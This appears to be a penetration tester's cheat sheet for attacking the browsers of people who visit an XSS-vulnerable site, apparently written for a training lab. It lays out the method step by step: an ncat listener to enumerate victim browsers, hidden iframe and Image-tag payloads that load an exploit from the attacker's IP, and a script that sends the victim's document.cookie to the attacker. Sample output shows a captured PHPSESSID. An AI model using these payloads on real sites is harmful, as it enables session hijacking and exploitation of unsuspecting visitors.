Targeting Web Browsers without BeEF
================================================================================

<br>

### Methodology

* Select your ‘hunting grounds’—a website vulnerable to XSS, CSRF, file inclusion, or some other method of presenting unsanitized code to visiting browsers.

* Exploit the vulnerability via request manipulation, comment post, etc. so that visiting browsers load your code and attempt to retrieve a resource from your IP address (browser redirection).

* Conduct victim browser recon with an Ncat listener to enumerate victim browsers.

* Prepare for your attack by setting up listener(s) to catch incoming reverse shells from exploited victims.

* Execute your attack by hosting the exploit as the resource that victim browsers retrieve from your IP address.

<br>

### Enumeration

<u>Victim Browser Recon</u>

[1] Set listener

```
root@kali:~# ncat –nvlp 80
```

[2] Get your XSS onto exploitable webpage.

[3] Victim browser sends you a request.

[4] Ncat receives request and its details:

```
connect to [10.11.0.5] from (UNKNOWN) [10.11.1.35] 49275
GET /report HTTP/1.1
Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, */*
Referer: http://127.0.0.1/index.php
Accept-Language: en-US
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729)
Accept-Encoding: gzip, deflate
Host: 10.11.0.5
Connection: Keep-Alive
```

<br>

### Exploit: XSS Enabling Manual Exploit Delivery

[1] Create and serve exploit code.

```
root@kali:~# cp /path/browser-exploit.js ./exploit.js
root@kali:~# python –m SimpleHTTPServer 80
```

[2] Get this code onto XSS-vuln webpage:

```
<iframe SRC="http://<kali_ipaddr>/exploit.js" height = "0" width = "0"></iframe>
```

[3] Victim browser sends HTTP GET request to Kali IP address for the resource “exploit.js”.

[4] SimpleHTTPServer sends exploit.js to victim browser, which loads it.

<br>

### Exploit Snippets

[1] Deliver exploit.js

```
<script>new Image().src="http://<kali_ipaddr>/exploit.js";</script>

-OR-

<iframe SRC="http://<kali_ipaddr>/exploit.js" height = "0" width = "0"></iframe>
```

[2] Receive authenticated session ID in HTTP GET request

```
<script> new Image().src="http://<kali_ipaddr>/bogus.php?output="+document.cookie; </script>
```

*Session ID cookie is appended to the resource in the GET request you receive:*

```
# nc -nlvp 80
  listening on [any] 80 ...
  connect to [10.11.0.5] from (UNKNOWN) [10.11.1.35] 49455
  GET /bogus.php?output=PHPSESSID=308f56771e83388c1c9069116054e80e HTTP/1.1
```

*Where `PHPSESSID=308f56771e83388c1c9069116054e80e` is the cookie.*

<br>

